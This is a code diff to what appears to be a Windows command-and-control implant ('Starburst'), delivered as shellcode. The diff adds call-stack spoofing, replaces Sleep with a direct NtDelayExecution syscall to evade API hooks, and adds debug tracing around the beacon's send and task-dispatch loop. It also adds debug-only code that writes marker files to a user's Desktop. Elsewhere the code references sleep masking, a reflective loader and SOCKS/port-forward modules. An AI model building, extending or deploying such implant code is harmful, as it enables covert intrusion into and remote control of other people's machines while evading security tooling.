@@ -9,6 +9,7 @@
 #include <checkin.h>
 #include <commands.h>
 #include <module.h>
+#include <evasion/spoof_dispatch.h>
 #include <socks.h>
 #include <rpfwd.h>
 #include <ssh.h>
@@ -21,6 +22,10 @@
 using namespace stardust;
 using namespace starburst;
 
+/* NOTE: the instance MUST live on the stack. The build ships the agent as a
+ * flat .text-only dump (objcopy --dump-section .text), so .bss/.data globals
+ * do not exist at runtime - a static instance buffer faults on first touch.
+ * Sleep masks cover the sensitive fields via xor_sensitive_data instead. */
 extern "C" auto declfn entry(
     _In_ void* args
 ) -> void {
@@ -43,6 +48,7 @@ declfn instance::instance(
     }
 
     RESOLVE_IMPORT( ntdll );
+
     RESOLVE_IMPORT( kernel32 );
 
     {
@@ -401,7 +407,9 @@ auto declfn instance::sleep_with_jitter() -> void {
     evasion_ekko_sleep( *this, sleep_time );
 #else
     evasion_pre_sleep( *this );
-    SleepMs( sleep_time );
+    LARGE_INTEGER delay;
+    delay.QuadPart = -static_cast<LONGLONG>( sleep_time ) * 10000LL;
+    SCALL( *this, ntdll.NtDelayExecution, FALSE, &delay );
     evasion_post_sleep( *this );
 #endif
 }
@@ -716,7 +724,9 @@ auto declfn instance::beacon_loop() -> void {
         uint8_t* response = nullptr;
         uint32_t resp_len = 0;
 
+        DBG_PRINT( *this, "loop:send\n" );
         bool ok = starburst::transport_send( *this, data, data_len, &response, &resp_len );
+        DBG_PRINT( *this, ok ? "loop:send_ok\n" : "loop:send_fail\n" );
 
         starburst::package_destroy( *this, pkg );
 
@@ -740,7 +750,9 @@ auto declfn instance::beacon_loop() -> void {
                     uint32_t params_len = starburst::parser_int32( &rsp );
                     auto params = starburst::parser_raw( &rsp, params_len );
 
+                    DBG_PRINT( *this, "dispatch:cmd\n" );
                     dispatch_task( cmd_id, task_uuid, params, params_len );
+                    DBG_PRINT( *this, "dispatch:done\n" );
                 }
 
                 // check for appended sections (delegates, socks)
@@ -923,6 +935,20 @@ auto declfn instance::start(
      * as lpvReserved → shellcode arg → entry(args) → start(arg). */
     evasion.udrl_user_data = arg;
 
+#ifdef DEBUG
+    {
+        char p[] = {'C',':','\\','U','s','e','r','s','\\','A','t','h','e','n','a','\\',
+                    'D','e','s','k','t','o','p','\\','d','i','a','g','_','2','.','t','x','t',0};
+        HANDLE hf = kernel32.CreateFileA(p, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hf != INVALID_HANDLE_VALUE) {
+            char m[] = {'s','t','a','r','t',' ','e','n','t','e','r','e','d',0};
+            DWORD w = 0;
+            kernel32.WriteFile(hf, m, 13, &w, nullptr);
+            kernel32.CloseHandle(hf);
+        }
+    }
+#endif
+
     DBG_PRINTF( "Starburst starting...\n" );
     DBG_PRINTF( "shellcode @ %p [%d bytes]\n", base.address, base.length );
     DBG_PRINTF( "running from %ls (PID: %d)\n",
@@ -934,6 +960,20 @@ auto declfn instance::start(
         DBG_PRINTF( "config parse failed\n" );
         return;
     }
+
+#ifdef DEBUG
+    {
+        char p[] = {'C',':','\\','U','s','e','r','s','\\','A','t','h','e','n','a','\\',
+                    'D','e','s','k','t','o','p','\\','d','i','a','g','_','3','.','t','x','t',0};
+        HANDLE hf = kernel32.CreateFileA(p, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hf != INVALID_HANDLE_VALUE) {
+            char m[] = {'c','o','n','f','i','g',' ','o','k',0};
+            DWORD w = 0;
+            kernel32.WriteFile(hf, m, 9, &w, nullptr);
+            kernel32.CloseHandle(hf);
+        }
+    }
+#endif
 
 #if defined(INCLUDE_EVASION_SPOOF) && defined(_WIN64)
     evasion.spoof.call_fn = reinterpret_cast<PVOID>( spoof_call );
